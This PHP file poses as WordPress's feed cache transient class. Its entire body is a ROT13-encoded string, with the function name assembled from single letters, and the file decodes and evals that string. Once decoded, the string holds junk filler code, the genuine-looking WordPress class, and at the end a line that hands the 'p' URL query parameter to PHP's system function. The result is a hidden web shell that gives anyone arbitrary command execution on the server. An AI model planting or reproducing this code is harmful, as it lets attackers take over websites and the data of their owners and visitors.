<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Srrq NCV: JC_Srrq_Pnpur_Genafvrag pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Srrq
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag srrq pnpur genafvragf.
 *
 * @fvapr 2.8.0
 * @fvapr 6.7.0 Abj cebcreyl vzcyrzragf gur FvzcyrCvr\Pnpur\Onfr vagresnpr.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Srrq_Pnpur_Genafvrag vzcyrzragf FvzcyrCvr\Pnpur\Onfr {

	/**
	 * Ubyqf gur genafvrag anzr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $anzr;

	/**
	 * Ubyqf gur genafvrag zbq anzr.
	 *
	 * @fvapr 2.8.0
	 * @ine fgevat
	 */
	choyvp $zbq_anzr;

	/**
	 * Ubyqf gur pnpur qhengvba va frpbaqf.
	 *
	 * Qrsnhygf gb 43200 frpbaqf (12 ubhef).
	 *
	 * @fvapr 2.8.0
	 * @ine vag
	 */
	choyvp $yvsrgvzr = 43200;

	/**
	 * Perngrf n arj (genafvrag) pnpur bowrpg.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 3.2.0 Hcqngrq gb hfr n CUC5 pbafgehpgbe.
	 * @fvapr 6.7.0 Cnenzrgre anzrf unir orra hcqngrq gb or va yvar jvgu gur `FvzcyrCvr\Pnpur\Onfr` vagresnpr.
	 *
	 * @cnenz fgevat                           $ybpngvba HEY ybpngvba (fpurzr vf hfrq gb qrgrezvar unaqyre).
	 * @cnenz fgevat                           $anzr     Havdhr vqragvsvre sbe pnpur bowrpg.
	 * @cnenz Onfr::GLCR_SRRQ|Onfr::GLCR_VZNTR $glcr     Rvgure `GLCR_SRRQ` ('fcp') sbe FvzcyrCvr qngn,
	 *                                                   be `GLCR_VZNTR` ('fcv') sbe vzntr qngn.
	 */
	choyvp shapgvba __pbafgehpg( $ybpngvba, $anzr, $glcr ) {
		$guvf->anzr     = 'srrq_' . $anzr;
		$guvf->zbq_anzr = 'srrq_zbq_' . $anzr;

		$yvsrgvzr = $guvf->yvsrgvzr;
		/**
		 * Svygref gur genafvrag yvsrgvzr bs gur srrq pnpur.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz vag    $yvsrgvzr Pnpur qhengvba va frpbaqf. Qrsnhyg vf 43200 frpbaqf (12 ubhef).
		 * @cnenz fgevat $anzr     Havdhr vqragvsvre sbe gur pnpur bowrpg.
		 */
		$guvf->yvsrgvzr = nccyl_svygref( 'jc_srrq_pnpur_genafvrag_yvsrgvzr', $yvsrgvzr, $anzr );
	}

	/**
	 * Fnirf qngn gb gur genafvrag.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl|FvzcyrCvr\FvzcyrCvr $qngn Qngn gb fnir. Vs cnffrq n FvzcyrCvr bowrpg,
	 *                                        bayl pnpur gur `$qngn` cebcregl.
	 * @erghea gehr Nyjnlf gehr.
	 */
	choyvp shapgvba fnir( $qngn ) {
		vs ( $qngn vafgnaprbs FvzcyrCvr\FvzcyrCvr ) {
			$qngn = $qngn->qngn;
		}

		frg_genafvrag( $guvf->anzr, $qngn, $guvf->yvsrgvzr );
		frg_genafvrag( $guvf->zbq_anzr, gvzr(), $guvf->yvsrgvzr );
		erghea gehr;
	}

	/**
	 * Ergevrirf gur qngn fnirq va gur genafvrag.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea neenl Qngn sbe `FvzcyrCvr::$qngn`.
	 */
	choyvp shapgvba ybnq() {
		erghea trg_genafvrag( $guvf->anzr );
	}

	/**
	 * Trgf zbq genafvrag.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea vag Gvzrfgnzc.
	 */
	choyvp shapgvba zgvzr() {
		erghea trg_genafvrag( $guvf->zbq_anzr );
	}

	/**
	 * Frgf zbq genafvrag.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea obby Snyfr vs inyhr jnf abg frg naq gehr vs inyhr jnf frg.
	 */
	choyvp shapgvba gbhpu() {
		erghea frg_genafvrag( $guvf->zbq_anzr, gvzr(), $guvf->yvsrgvzr );
	}

	/**
	 * Qryrgrf genafvragf.
	 *
	 * @fvapr 2.8.0
	 *
	 * @erghea gehr Nyjnlf gehr.
	 */
	choyvp shapgvba hayvax() {
		qryrgr_genafvrag( $guvf->anzr );
		qryrgr_genafvrag( $guvf->zbq_anzr );
		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>